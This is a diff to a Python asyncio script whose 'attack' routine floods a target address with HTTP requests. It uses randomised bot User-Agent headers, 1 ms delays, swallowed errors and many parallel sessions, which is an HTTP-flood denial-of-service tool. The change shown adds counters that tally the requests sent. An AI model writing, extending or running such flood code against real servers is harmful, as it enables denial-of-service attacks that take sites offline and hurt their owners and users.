@@ -8,6 +8,7 @@ def random_ip():
 
 
 async def attack(session, addr, stopFlag):
+    localCount = 0
     while not stopFlag.is_set():
         headers = {
             "User-Agent": f"MyBot/{random.randint(1,100)}",
@@ -18,7 +19,9 @@ async def attack(session, addr, stopFlag):
                 await response.text()
         except:
             pass
+        localCount += 1
         await asyncio.sleep(0.001)
+    return localCount
 
 
 class AttackTarget:
@@ -29,6 +32,7 @@ class AttackTarget:
         self._stop_flag = asyncio.Event()
         self.loop = asyncio.new_event_loop()
         self._tasks = []
+        self.attackCount = 0
 
     async def attack(self):
         if self.target:
@@ -41,7 +45,8 @@ class AttackTarget:
                     for _ in range(min(self.sessionCount, self.maxSessionCount))
                 ]
                 try:
-                    await asyncio.gather(*self._tasks)
+                    results = await asyncio.gather(*self._tasks)
+                    self.attackCount = sum(results)
                 except asyncio.CancelledError:
                     pass
 
